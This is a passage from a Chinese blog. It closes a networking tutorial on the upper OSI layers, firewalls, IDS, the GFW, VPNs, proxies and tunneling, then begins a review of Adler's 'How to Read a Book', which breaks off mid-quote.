<h3 id="◇业务层的必要性"><a href="#◇业务层的必要性" class="headerlink" title="◇业务层的必要性"></a>◇业务层的必要性</h3><p>　　业务层显然是必要滴。因为传输层位于操作系统，它不可能去了解网络软件的业务逻辑。为了让网络软件能够相互通讯，肯定要在传输层之上再定义更高层的协议。<br>　　问题在于：网络软件千奇百怪，其业务逻辑各不相同，因此，“业务层如何设计”，【无】一定之规。有些软件只用一个协议来搞定所有的业务逻辑（只有一层）；有些软件会参考 OSI，把业务逻辑的协议分为三层；还有些软件可能会分出更多的层次。<br>　　再强调一下：业务层的协议如何分层，完全看具体的业务逻辑，不要生搬硬套任何现有的参考模型。</p>
<h3 id="◇会话层-＆-表示层-＆-应用层"><a href="#◇会话层-＆-表示层-＆-应用层" class="headerlink" title="◇会话层 ＆ 表示层 ＆ 应用层"></a>◇会话层 ＆ 表示层 ＆ 应用层</h3><p>　　对于大部分读者来说，【没必要】花时间去了解 OSI 最上面三层之间的区别。你只需把最上面三层视作【一坨】——他们都是与网络软件的业务逻辑密切相关滴。<br>　　那么，哪些人需要详细了解“这三层的差异”捏？<br>　　如果你是个程序员，并且你正好是开发【网络】软件，俺建议你了解一下 OSI 模型的最上面三层，有助于你更深刻地思考某些网络协议的设计。</p>
<h2 id="★业务层（OSI-上三层）：具体实例"><a href="#★业务层（OSI-上三层）：具体实例" class="headerlink" title="★业务层（OSI 上三层）：具体实例"></a>★业务层（OSI 上三层）：具体实例</h2><h3 id="◇业务层的【协议】"><a href="#◇业务层的【协议】" class="headerlink" title="◇业务层的【协议】"></a>◇业务层的【协议】</h3><p>　　业务层的协议非常多。即使光把各种协议的名称列出来，也很费劲。所以俺就偷懒一下，只点评几个特别重要的协议。</p>
<p><strong>HTTP 协议</strong><br>　　如果让俺评选最重要的业务层协议，俺首推 HTTP 协议。互联网的普及推动了 Web 的普及，而 Web 的普及使得 HTTP 成为信息时代的重要支柱。当你上网的时候，你看到的网页（HTML 页面）就是通过 HTTP 协议传输到你的浏览器上。<br>　　如今 HTTP 已经不仅仅用来展示网页，还有很多业务层的协议是建立在 HTTP 协议之上。比如说：如果你用 RSS 订阅俺的博客，RSS 阅读器需要调用 blogspot 博客平台提供的 RSS 接口，这些 RSS 接口就是基于 HTTP 协议传输滴。<br>　　考虑到本文的篇幅，俺不可能在这里细聊 HTTP 协议的规格，有兴趣的同学可以去看《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1TgujhFUzyVlf1W5e48lSMTIwJuCTElvXw2LgQ_Ng0Cs/">HTTP 权威指南</a>》这本书。</p>
<p><strong>SSL/TLS 协议</strong><br>　　最早的 HTTP 协议是【明文】滴；为了强化安全性，后来又设计了 SSL 协议，用来【加密】HTTP 流量；再后来，SSL 升级为 TLS（这俩是同义词）。如今经常看到的 HTTPS 相当于“HTTP over TLS”。<br>　　SSL/TLS 设计得比较优雅（很灵活），使得其它业务层的协议可以很方便地架构在 SSL/TLS 之上。这样的好处是：其它协议就不用自己再设计一套加密机制＆认证机制。<br>　　SSL/TLS 对于安全性很重要。</p>
<p><strong>域名相关的协议（DNS 及其它）</strong><br>　　域名相关的协议，也很重要。因为域名系统是整个互联网的基础设施。最早的域名查询协议是“DNS 协议”，由于这个协议【没有】加密，导致了一些安全隐患。比如 GFW 就利用 DNS 的这个弱点，搞“域名污染/域名投毒”。因此，后来又设计了一系列新的域名协议，引入了加密的机制。</p>
<h3 id="◇业务层相关的【网络设备】"><a href="#◇业务层相关的【网络设备】" class="headerlink" title="◇业务层相关的【网络设备】"></a>◇业务层相关的【网络设备】</h3><p><strong>应用层防火墙（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Application_firewall">application firewall</a>）</strong><br>　　前面提到了：大多数网络防火墙处于4层（状态防火墙），另外还有少数处于7层，也就是“应用层防火墙”（有时候也称之为“7层防火墙”）。<br>　　一般来说，这类防火墙具备了【深度包检测】（deep packet inspection，简称 DPI）的能力，可以分析应用层协议的【内容】。<br>　　简单说一下“深度包检测”：<br>　　如果某个网络设备，仅仅分析“应用层协议”本身，它还【不够格】称之为 DPI。为了做到 DPI，还要能理解应用层协议所承载的【内容】。<br>　　比如说：某人通过【明文】的 HTTP 协议从网上下载了一个 zip 压缩包。对于这个下载行为，那些做得好的 DPI 设备不光能识别出“HTTP 协议的内容是 ZIP 压缩包”，而且还能从 ZIP 压缩包中提取出里面的文件。</p>
<p><strong>入侵检测（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Intrusion_detection_system">intrusion detection system</a>）</strong><br>　　一般来说，“入侵检测”如果不加定语，通常指“【网络】入侵检测”（洋文叫 NIDS）；另外还有一种“【主机】入侵检测”（洋文叫 HIDS）。HIDS 与本文无关。<br>　　“入侵检测”是一种网络安全设备，它通过嗅探（sniffer）的方式抓取网上的数据包，然后进行分析，尝试发现网络中是否存在黑客/骇客的入侵的行为。故名“入侵检测”。<br>　　由于 IDS 需要理解【应用层】（7层）的内容，因此它与“应用层防火墙”有个共同点，需要具备某种程度的 DPI（深度包检测）能力。它俩的一大差异是【部署方式】。<br>　　考虑到很多读者是 IT 外行，简单说一下“旁路部署”——<br>如果你学过中学物理，应该知道电路有“串联 ＆ 并联”。所谓的“旁路部署”类似于电路中的【并联】。通俗地说：IDS 是【并联】部署，防火墙是【串联】部署。</p>
<p><strong>GFW（Great Firewall）</strong><br>　　本博客已经写了很多翻墙教程，大伙儿肯定都知道 GFW 了。<br>　　由于“Great Firewall”中有“Firewall”字样，很多天朝网民【误以为】GFW 是防火墙，其实不然！GFW 本质上就是 IDS——其部署方式类似于 IDS（旁路部署），其工作方式有很大一部分也类似于 IDS（当然啦，GFW 的功能比 IDS 更多）。<br>　　大约七八年前，就有热心读者建议俺写一篇技术博文，介绍 GFW 的工作原理。由于俺比较懒，拖到今年（2021）都没动手，很惭愧 :(</p>
<h2 id="★杂项"><a href="#★杂项" class="headerlink" title="★杂项"></a>★杂项</h2><p>　　有些概念，并不属于某个特定的层次，单独放到这个章节。</p>
<h3 id="◇VPN（virtual-private-network）"><a href="#◇VPN（virtual-private-network）" class="headerlink" title="◇VPN（virtual private network）"></a>◇VPN（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Virtual_private_network">virtual private network</a>）</h3><p>　　咱们天朝的网民使用 VPN，一多半是为了翻墙。其实 VPN 的本意（如其名称所示）是为了提供某种虚拟化的私有的网络，让身处异地的多个人，可以用 VPN 构建出一个虚拟的内网，从而能在这个内网中协同工作。<br>　　VPN 的类型很多，使用的技术也各不相同，因此 VPN 对应的 OSI 层次很宽（“1层”到“6层”）。俺到维基百科剽窃了如下这张图，让你见识一下 VPN 的多样性。</p>
<p><img src="https://lh4.googleusercontent.com/qXbaBYZBvZ5k6gn4mp2M0dCYFW1rK_HR3JTCRYoWpGyNo9AZ6i90LgQzZgvL0OqImrf6j5FNAbDQDHG5k9I4iHVsm7FCSSHYhCV0yKJsz5vAH9Fil_4ZxclOoHSjlUH2aLA8Gv3hMcU" alt="不见图 请翻墙"><br>（名目繁多的 VPN，分类示意图）</p>
<h3 id="◇代理（proxy）"><a href="#◇代理（proxy）" class="headerlink" title="◇代理（proxy）"></a>◇代理（proxy）</h3><p>　　那些经常翻墙的同学，对“代理”应该都很熟悉了。“代理”与 VPN 类似，一开始并不是用来翻墙滴，“翻墙”只是这俩的副业。</p>
<p><strong>代理服务器（proxy server）</strong><br>　　“代理服务器”部署在“客户端 ＆ 服务端”之间，起到某种“中介”的作用。“代理服务器”的类型有很多，干的事情各不相同。</p>
<p><img src="https://lh6.googleusercontent.com/wklKf5goUVXTzmjccmfjIRpKKxZd-9vhT_0HMy3KknjAU7Oxj0GPgC7jjjO0BAfl6f-fapaBgHSp0mtsE1sS6ZyypE-ESB4idMi-ReKKU17Z1k_oVKupiOQcX3uQTlfU_P0VjoiZnG4" alt="不见图 请翻墙"><br>（“代理服务器”的简单示意图）</p>
<p><strong>代理客户端（proxy client）</strong><br>　　早期的代理服务器，【不】需要“代理客户端”。因为早期的“代理服务器”支持的是【标准协议】。比如“HTTP proxy server”支持的是标准 HTTP协议，而用户的电脑上，已经有浏览器（原生支持 HTTP 协议）。这种情况下，自然不需要再有“代理客户端”。<br>　　后来，为了满足某些特殊需求（比如翻墙），“代理服务器”必须使用某种特殊的（非标准的）协议。因此，就必须在用户的环境中安装“代理客户端”。对于翻墙来说，你装的翻墙软件，相当于“代理客户端”。</p>
<p><strong>代理的层次</strong><br>　　“代理”也分不同的层次。比较常见的有如下几种：</p>
<blockquote>
<p>TCP 代理（TCP 端口转发）——4层（传输层）<br>SOCKS 代理——5层（会话层）<br>HTTP 代理——7层（应用层）<br>……</p>
</blockquote>
<h3 id="◇网关（gateway）"><a href="#◇网关（gateway）" class="headerlink" title="◇网关（gateway）"></a>◇网关（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Gateway_(telecommunications)">gateway</a>）</h3><p>　　前面的某些章节，已经稍微提及了“网关”这个概念，但还没有具体介绍它。<br>　　严格来讲，“网关”是一个逻辑概念，【不要】把它当成具体的网络设备。充当“网关”的东东，可能是：路由器 or XX层交换机 or XX层防火墙 or 代理服务器 ……<br>　　“网关”也分不同的层次。如果不加定语，通常指的是“3层网关”（网络层网关）。列几种比较常见的，供参考：</p>
<blockquote>
<p>路由器充当网关——3层（网络层）<br>3层交换机充当网关——3层（网络层）<br>4层交换机充当网关——4层（传输层）<br>应用层防火墙充当网关——7层（应用层）<br>代理服务器充当网关——（取决于代理的层次，参见前一个小节）<br>……</p>
</blockquote>
<h3 id="◇隧道协议（tunneling-protocol）"><a href="#◇隧道协议（tunneling-protocol）" class="headerlink" title="◇隧道协议（tunneling protocol）"></a>◇隧道协议（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Tunnelling_protocol">tunneling protocol</a>）</h3><p>　　所谓的“隧道协议”，通俗地说就是：用某种协议包裹另一种协议，以满足某些特殊的需求。<br>　　看到这里，估计某些同学会感到纳闷——因为俺在本文开头介绍“协议栈”的时候提到说：相邻的两层协议，下层会包裹上层。“隧道协议的包裹”与“上下层协议的包裹”，差别在哪捏？<br>　　俺来解释一下：<br>　　“隧道协议”可以做到更灵活的包裹——既可以对层次相隔很远的协议进行包裹，也可以对同一层的协议进行包裹，甚至可以“倒挂”——所谓的“倒挂”就是让【上】层反过来包裹【下】层。<br>　　举例：<br>　　俺曾经写过一篇《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/04/Proxy-Tricks.html">如何让【不支持】代理的网络软件，通过代理进行联网（不同平台的 N 种方法）</a>》，其中介绍了“HTTP 代理”的两种模式：“转发模式 ＆ 隧道模式”。对于“HTTP 代理”的隧道模式，可以实现【TCP over HTTP】（把 TCP 协议打包到 HTTP 协议内部），这就是刚才所说的“倒挂”。<br>　　另外，VPN 小节的那张图中，有些类型的 VPN 就是用“隧道协议”的机制实现。</p>
<h3 id="◇（其它杂项）"><a href="#◇（其它杂项）" class="headerlink" title="◇（其它杂项）"></a>◇（其它杂项）</h3><p>　　可能还有一些杂七杂八的东东，没来得及聊。如果你觉得有些【网络相关】的概念，不太明白，欢迎到博客留言，进行反馈。<br>　　俺会根据大伙儿的反馈，再对这篇教程进行补充。</p>
<h2 id="★参考书目"><a href="#★参考书目" class="headerlink" title="★参考书目"></a>★参考书目</h2><p>　　如下几本书，都在<a target="_blank" rel="noopener" href="https://github.com/programthink/books">俺的网盘</a>上分享了电子版。</p>
<table>
<thead>
<tr>
<th>中文书名</th>
<th>英文书名</th>
<th>作者</th>
</tr>
</thead>
<tbody><tr>
<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》</td>
<td>《Computer Networks》</td>
<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Andrew_S._Tanenbaum">Andrew Tanenbaum</a> David Wetherall</td>
</tr>
<tr>
<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1tlbsKWyddVLeB3HSWUiq7KtkltLeClIbPtkyN6642O4/">计算机网络——自顶向下方法</a>》</td>
<td>《Computer Networking——A Top-Down Approach》</td>
<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Jim_Kurose">James Kurose</a> <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Keith_W._Ross">Keith Ross</a></td>
</tr>
<tr>
<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Fw2wSr-MgNm1d_M6F-rF1t_n3LwFWWBHrJt6vcYGta4/">TCP-IP 详解</a>》</td>
<td>《TCP-IP Illustrated》</td>
<td><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E5%8F%B2%E8%92%82%E6%96%87%E6%96%AF">Richard Stevens</a></td>
</tr>
<tr>
<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1eB4BLE9PDXDfrb-ioXNfrHlOthMqUe0MXs8PmRsm3Os/">UNIX 网络编程</a>》</td>
<td>《UNIX Network Programming》</td>
<td><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E5%8F%B2%E8%92%82%E6%96%87%E6%96%AF">Richard Stevens</a></td>
</tr>
<tr>
<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1TgujhFUzyVlf1W5e48lSMTIwJuCTElvXw2LgQ_Ng0Cs/">HTTP 权威指南</a>》</td>
<td>《HTTP——The Definitive Guide》</td>
<td>David Gourley Brian Totty Marjorie Sayer Sailu Reddy Anshu Aggarwal</td>
</tr>
</tbody></table>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T13:32:13.000Z" title="2021/7/16 下午9:32:13">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:20:55.702Z" title="2021/7/16 下午11:20:55">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></span><span class="level-item">35 分钟读完 (大约5324个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6%EF%BC%9F/">如何阅读一本书？</a></h1><div class="content"><h1 id="《如何阅读一本书》——书评及内容纲要"><a href="#《如何阅读一本书》——书评及内容纲要" class="headerlink" title="《如何阅读一本书》——书评及内容纲要"></a>《如何阅读一本书》——书评及内容纲要</h1><p><strong>文章目录</strong></p>
<p>★为啥要推荐这本书？<br>★此书的影响力<br>★阅读的目的<br>★主动阅读 VS 被动阅读<br>★阅读的层次<br>★如何读不同类型的书籍<br>★阅读与心智的成长</p>
<h2 id="★为啥要推荐这本书？"><a href="#★为啥要推荐这本书？" class="headerlink" title="★为啥要推荐这本书？"></a>★为啥要推荐这本书？</h2><p>　　俺写博客奉行一个宗旨——【<strong>授人以鱼不如授人以渔</strong>】。而《如何阅读一本书》是阅读方面非常非常重要的【渔】。<br>　　为啥俺要介绍阅读方面的【渔】？主要有两个原因：<br><strong>原因1</strong><br>　　想必大伙儿都意识到一个现象——如今大众的阅读水平是很差滴。即使一本不算难也不算厚的书，很多人也无法胜任。有些人甚至连阅读一篇较长的博文（超过1万字）都做不到——所以俺的大部分博文都尽量控制在几千字，以照顾某些阅读能力不够的同学。<br><strong>原因2</strong><br>　　还有一个原因促使俺推荐此书——最近半年分享了<a target="_blank" rel="noopener" href="https://github.com/programthink/books">很多电子书</a>。但是据俺收到的反馈，很多人虽然下载了，却没怎么读。俺猜测，还有些人是因为缺乏阅读技能，导致收获不大。</p>
<p>　　如果你也感觉自己的阅读能力有待提高，这本书是非常非常值得【从头看完】滴。</p>
<h2 id="★此书的影响力"><a href="#★此书的影响力" class="headerlink" title="★此书的影响力"></a>★此书的影响力</h2><p>　　俺单独写一篇博文来推荐的书，通常都是老书——这本也不例外。<br>　　此书最早出版于1940年（在这个年代，可能你的父母还没出生）当时立刻就成为畅销书，还被翻译成多种文字。到1972年又出了一个修订版，补充了很多的内容。本文介绍的就是上世纪70年代的那个版本。<br>　　一本书历经这么久，还值得还单独写一篇博文推荐，足以说明其价值。<br>　　下面，结合俺个人的体会，对此书做一下内容简介。<br>　　强调一下：<strong>光看俺的内容简介是远远不够滴，一定要花时间自己从头到尾看完！！！</strong></p>
<h2 id="★阅读的目的"><a href="#★阅读的目的" class="headerlink" title="★阅读的目的"></a>★阅读的目的</h2><p>　　在书的第1章（阅读的活力与艺术）就总结了阅读的三种目的：娱乐消遣、获取资讯、增进理解力。<br>　　啥是“娱乐消遣”捏？大伙儿应该都明白，俺就不说了。<br>　　“获取资讯”和“增进理解力”，可能很多人不太清楚这两者的区别。俺打一个不太恰当的比方：“获取资讯”如同在平地走路，而“增进理解力”如同爬山。</p>
<p><strong>以【获取资讯】为目的</strong><br>　　这种阅读目的，你只是获取信息，只需要动用“记忆力”。所以，这种阅读是比较【轻松】滴。轻松的代价就是——这样的阅读给你的帮助不够大。<br>　　比如：对新闻的阅读，就属于这类；对大部分小说的阅读，也属于这类。</p>
<p><strong>以【增进理解力】为目的</strong><br>　　如果某本书的内容超出了你的理解力，或者超出了你所熟悉的领域，那么你就需要花一定的力气才能读懂。这时候，光靠记忆力就远远不够了。你需要动用大脑的其它能力（分析、推理、总结、想像……）。显然，这种阅读过程伴随着更多的思考，可以让你的头脑提升到新的高度。</p>
<h2 id="★主动阅读-VS-被动阅读"><a href="#★主动阅读-VS-被动阅读" class="headerlink" title="★主动阅读 VS 被动阅读"></a>★主动阅读 VS 被动阅读</h2><p>　　所谓的“主动阅读”，指的是：你要带着问题去阅读，要一边阅读一边思考。俺称之为“挖掘式的阅读”。<br>　　“被动阅读”与之相反，在阅读过程中没有思考。俺称之为“灌输式的阅读”。<br>　　如果阅读目的是“增进理解力”，就是典型的主动阅读；如果是为了“娱乐消遣”，基本上是被动阅读；至于目的是“获取资讯”的阅读，则两者兼而有之。</p>
<p>　　如今大部分人只懂得“灌输式的阅读”，俺觉得主要原因有两个：<br><strong>1. 教育体制</strong><br>　　天朝的教育，从来都是“灌输式”的。这样的教育培养出来的人，显然比较适应被动的阅读（被动灌输），而无法进行主动的阅读（主动挖掘）。<br>　　另外，天朝的官方教育，从来就没有系统性地培养独立思维能力，尤其是“批判性思维”的能力（关于“批判性思维”的入门，请看俺之前的博文，在“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2010/10/book-review-asking-right-questions.html">这里</a>”）<br><strong>2. 快餐文化</strong><br>　　而如今的网民，大部分人把大部分的时间花在消遣性的阅读，长期以往，主动阅读的能力就逐渐退化。<br>　　这方面的危害，微博客（microblog）尤甚——微博客不但碎片化很严重，而且助长了消遣性阅读的风气。（之前写过<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/02/microblog-and-time-management.html">一篇博文</a>，分析微博客的弊端）</p>
<p>　　那么，怎样才是“带着问题阅读”捏？作者写道：</p>
<blockquote>
<p>关于一本书，你一定要提出四个主要的问题。</p>
<p>(1) 整体来说，这本书到底在谈些什么？<br>你一定要想办法找出这本书的主题，作者如何依次发展这个主题，如何逐步从核心主题分解出从属的关键议题来。</p>
<p>(2) 作者在细部说了什么，怎么说的？<br>你一定要想办法找出主要的想法、声明与论点。这些组合成作者想要传达的特殊讯息。</p>
<p>(3) 这本书说得有道理吗？<br>是全部有道理，还是部分有道理？除非你能回答前两个问题，否则你没法回答这个问题。在你判断这本书是否有道理之前，你必须先了解整本书在说些什么才行。然而，等你了解了一本书，如果你又读得很认真的话，你会觉得有责任为这本书做个自己的判断。光是知道作者的想法是不够的。</p>
<p>(4) 这本书跟你有什么关系？<br>如果这本书给了你一些资讯，你一定要问问这些资讯有什么意义。为什么这位作者会认为知道这件事很重要？你真的有必要去了解吗？如果这本书不只提供了资讯，还启发了你，就更有必要找出其他相关的、更深的含意或建议，以获得更多的启示。</p>
</blockquote>
<p>　　更多内容，请看此书的第5章——如何做一个自我要求的读者</p>
<h2 id="★阅读的层次"><a href="#★阅读的层次" class="headerlink" title="★阅读的层次"></a>★阅读的层次</h2><p>　　此书的重点内容在于：介绍了4种阅读层次。<br>　　为啥称“层次”而不称“类型”，因为层次有“高低之分”，而且层次之间是递进关系而不是并列关系——上面的层次需要依赖下面层次的技能。</p>
<h3 id="◇基础阅读"><a href="#◇基础阅读" class="headerlink" title="◇基础阅读"></a>◇基础阅读</h3><p>　　顾名思义，这是最基本的阅读层次。在这个层次，只需要你做到“读懂书籍<strong>字面上</strong>的意思”。需要的技能仅仅是：识字、断句、联系上下文、等。<br>　　显然，列位看官都已经具备这个层次了——不具备这个层次的人，相当于半文盲。<br>　　对于这个层次，只是在第3章大概介绍了一下。因为咱们都不是学龄前儿童，所以这个层次不是重点。</p>
<h3 id="◇检视阅读"><a href="#◇检视阅读" class="headerlink" title="◇检视阅读"></a>◇检视阅读</h3><p>　　此书的第4章介绍“检视阅读”的各种技巧。<br>　　检视阅读有时候也可以称为“略读”。它要达到的目的就是：在非常有限的时间内，大致搞清楚一本书的内容和主题。<br>　　很多人可能看不起“略读”，其实这个技能是很有用滴。掌握这个技能，有助于你用尽可能短的时间，判断一本书的优劣。这样就避免在烂书上浪费太多时间。另外，在后续的“主题阅读”层次，也非常依赖“检视阅读”的能力。<br>　　举个例子：自从俺开始提供<a target="_blank" rel="noopener" href="https://github.com/programthink/books">电子书下载</a>，很多热心读者会主动分享电子书给俺。有些读者分享的电子书，俺从来没看过，如何判断此书要不要放到网盘上共享捏？这时候俺就会先采用“检视阅读”的各种技巧，快速判断该书的价值。</p>
<h3 id="◇分析阅读"><a href="#◇分析阅读" class="headerlink" title="◇分析阅读"></a>◇分析阅读</h3><p>　　分析阅读有时候也可以称为“精读”。一看到“精读”这个词，你就晓得这是重要的技能了。显然，只有对有价值的书，才值得花力气做“分析阅读”。“烂书或平庸的书”是没有这种待遇的。<br>　　这本书花了大量的篇幅来介绍“分析阅读”。这部分是此书【<strong>重点中的重点</strong>】。</p>
<p>　　分析阅读包括如下几个阶段：</p>
<p><strong>第1阶段——这本书在谈些啥</strong><br>主要在第7章介绍。这个阶段你需要做如下4件事情。<br>(1) 依照书本的种类与主题作分类。<br>(2) 用最简短的句子说出整本书在谈些什么。<br>(3) 按照顺序与关系，列出全书的重要部分。将全书的纲要拟出来之后，再将各个部分的纲要也一一列出。<br>(4) 找出作者在问的问题，或作者想要解决的问题。</p>
<p><strong>第2阶段——诠释整本书的内容</strong><br>主要在第8章和第9章介绍。这个阶段你需要做如下4件事情。<br>(5) 找出重要的、关键性的词汇，透过它们与作者达成共识<br>(6) 从最重要的句子里抓出作者的重要主旨。<br>(7) 找出作者在论述些啥，重新架构这些论述的因果关系，以明白作者的主张。<br>(8) 搞清楚作者已经解决了哪些问题，还有哪些是未解决的。在未解决的问题中，哪些是作者认为自己无法解决的。</p>
<p><strong>第3阶段——评价这本书</strong><br>主要在第10章和第11章介绍。<br>(9) 除非你已掌握某本书的架构，也能诠释整本书了，否则不要轻易评论。<br>(10) 不要争强好胜，非辩到底不可。<br>(11) 在说出评论之前，你要能区分出书中的“事实”与“观点”（参见俺的另一篇博文：《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/05/difference-between-fact-and-opinion.html">批判性思维扫盲：学会区分”事实”与”观点”</a>》）<br>如果要做出<strong>批评性</strong>的评价，需要做到如下几条之一：<br>(12) 证明作者的知识不足。<br>(13) 证明作者的知识有误。<br>(14) 证明作者的逻辑错误（关于常见逻辑谬误，俺写过一篇扫盲，在“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2011/03/logical-fallacies.html">这里</a>”）。<br>(15) 证明作者的分析与理由不够完整。</p>
<p>　　另外，在第12章介绍了辅助阅读。包括利用外在的工具和资源（比如工具书，百科全书、字典、等）辅助阅读某本书。<br>　　说到“百科全书”，稍微引申一下。<br>　　如今百科类的网站已经很成熟了。这类网站可以非常有效地作为阅读的辅助工具。在《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/03/internet-resource-discovery-1.html">网站的类型和使用场景</a>》一文中，大致介绍了俺如何使用百科类网站。<br>在所有的百科类网站中，本人强烈推荐“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/">维基百科</a>”——其内容之丰富是无与伦比的，而且包括多语种，有助于提升你阅读洋文的功底。</p>
<h3 id="◇主题阅读"><a href="#◇主题阅读" class="headerlink" title="◇主题阅读"></a>◇主题阅读</h3><p>　　关于主题阅读，主要在第20章介绍。<br>　　所谓的“主题阅读”，通俗而言就是：为了研究某个主题，阅读跟该主题相关的多本书籍。这种阅读主要包括5个步骤：</p>
<p><strong>1. 找到这几本书的相关章节</strong><br>　　这时候，“检视阅读”又派上用场了。</p>
<p><strong>2. 带引作者与你达成共识</strong><br>　　这个步骤有点类似于“分析阅读”的第2阶段。</p>
<p><strong>3. 厘清问题</strong><br>　　你可以列出一些问题，然后看看这几本书能否回答这些问题。</p>
<p><strong>4. 界定议题</strong><br>　　如果几本不同的书籍都能够回答同一个问题，并且答案有差异。那么，你可以根据答案的差异、作者的情况、进而判断出这个问题的价值。<br>　　比方说：如果某个问题，多本书的作者给出全然不同的答案，而且这几本书的作者在立场的客观性、分析的全面性、思维的深度等方面都足够。那么这个问题就是一个非常有价值的问题，值得深入思考。</p>
<p><strong>5. 分析讨论</strong><br>　　找到有价值的问题之后，就需要通过自己的综合分析，思考一下：【为什么】这几本书的作者，对同一个问题会有不同的答案。如果你能想明白，那么你对该主题所处的领域，就有了更深刻的理解。</p>
<h2 id="★如何读不同类型的书籍"><a href="#★如何读不同类型的书籍" class="headerlink" title="★如何读不同类型的书籍"></a>★如何读不同类型的书籍</h2><p>　　这本书的如下章节，分别介绍了具体类型的书籍，有哪些阅读技巧。</p>
<blockquote>
<p>第13章 如何阅读实用型的书<br>第14章 如何阅读想像文学<br>第15章 如何阅读故事、戏剧、诗歌<br>第16章 如何阅读历史书<br>第17章 如何阅读科学与数学<br>第18章 如何阅读哲学书<br>第19章 如何阅读社会科学</p>
</blockquote>
<h2 id="★阅读与心智的成长"><a href="#★阅读与心智的成长" class="headerlink" title="★阅读与心智的成长"></a>★阅读与心智的成长</h2><p>　　这是此书最后一章的内容，包括如下几个小节：</p>
<h3 id="◇好书能带来什么帮助？"><a href="#◇好书能带来什么帮助？" class="headerlink" title="◇好书能带来什么帮助？"></a>◇好书能带来什么帮助？</h3><p>　　前面介绍的，都是关于“如何更好地阅读”，但是书籍本身的好坏也很重要。关于好书的重要性，俺摘录一段：</p>
<blockquote>
<p>读一本好书，却会让你的努力有所回报。最好的书对你的回馈也最多。当然，这样的回馈分成两种：第一，当你成功地阅读了一本难读的好书之后，你的阅读技巧必然增进了。第二（长期来说这一点更重要）一本好书能教你了解这个世界以及你自己。你不只更懂得如何读得更好，还更懂得生命。你变得更有智慧，而不只是更有知识—像只提供讯息的书所形成的那样。你会成为一位智者，对人类生命中永恒的真理有更深刻的体认。</p>
</blockquote>
<p>　　请注意这段提到的两个词【知识】和【智慧】——只提供讯息的书，带给你“知识”；而真正的好书带给你“智慧”。至于消遣性的书，既不会给你知识，也不会给你智慧。</p>
<h3 id="◇书籍的金字塔"><a href="#◇书籍的金字塔" class="headerlink" title="◇书籍的金字塔"></a>◇书籍的金字塔</h3><p>　　书籍的好坏是符合【二八原理】滴！<br>　　关于书籍的金字塔，包括三层：</p>
<p><strong>第1层</strong><br>　　99% 的书籍对于你的能力提升是毫无帮助的。这 99% 里面，相当大一部分书是“消遣性”的，还有一些可能是跟你完全无关的领域。<br>　　显然，这些书籍是不需要进行“分析阅读”的。</p>
<p><strong>第2层</strong><br>　　这一层次的书籍，你至少要做一次完整的“分析阅读”。经过一次分析阅读之后，你基本上就“读通”了，知道这本书的主要精华。一旦读通，以后你就无需再去阅读。顶多是偶尔拿出来翻看个别重点，复习某些片段。</p>
<p><strong>第3层</strong><br>　　这一层次的书，非常非常少。它们的特点是：你无法通过一次完整的“分析阅读”，就把它读通。甚至有可能你进行了 N 次分析阅读，也无法尽其究竟。<br>　　为啥会这样捏？俺介绍一下第2层与第3层之间的微妙差异：</p>
<p><strong>第2层与第3层的差异</strong><br>　　第2层的书<br>　　当你进行多次分析阅读，每次的收获会变少。因为你的本人的积累增多了，理解力提升了，而书的内容是固定的。显然每次阅读，收获降低了。<br>　　第3层的书<br>　　随着你的能力提升，每一次对该书进行分析阅读，你的收获都是全新的。甚至有可能后面的阅读，收获会更多。为啥会这样捏？因为这类书的作者，境界远远高于你本人。有可能在你一生的不同阶段都可以反复阅读同一本书，始终有收获。因为你始终达不到该书作者的境界。</p>
<h3 id="◇生命与心智的成长"><a href="#◇生命与心智的成长" class="headerlink" title="◇生命与心智的成长"></a>◇生命与心智的成长</h3><p>　　这一节有两段话，俺摘录如下（粗体是俺标注滴）。希望能激发大伙儿对思考的热情。</p>
<blockquote>
<p>　　人类的心智有很奇怪的一点，主要是这一点划分了我们心智与身体的截然不同。我们的身体是<strong>有限制</strong>的，心智却<strong>没有限制</strong>。其中一个迹象是，在力量与技巧上，身体不能无限制地成长。人们到了30岁左右，身体状况就达到了巅峰，随着时间的变化，身体的状况只有越来越恶化，而<strong>我们的头脑却能无限地成长与发展下去</strong>。我们的心智不会因为到了某个年纪死就停止成长，只有当大脑失去活力，僵化了，才会失去了增加技巧与理解力的力量。</p>
